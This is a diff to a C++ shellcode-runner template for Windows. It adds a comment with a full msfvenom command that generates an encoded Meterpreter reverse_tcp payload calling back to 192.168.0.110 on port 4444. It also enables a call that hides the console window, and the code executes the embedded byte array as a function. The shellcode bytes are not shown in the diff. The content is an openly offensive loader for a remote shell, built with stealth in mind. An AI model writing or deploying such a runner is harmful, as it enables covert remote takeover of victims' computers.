@@ -1,6 +1,7 @@
 // this is template for c++ based shell code
 #include <iostream>
-// #include <windows.h>
+#include <windows.h>
+// msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.110 lport=4444 --platform windows -a x86 -b "\x00" -e x86/shikata_ga_nai -f c
 using namespace std;
 
 unsigned char code[] =
@@ -64,7 +65,7 @@ int main(int argc, char **argv)
     {
         cout << code[i];
     }
-    // ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
     int foo_value = 0;
 
     int (*foo)() = (int (*)())code;
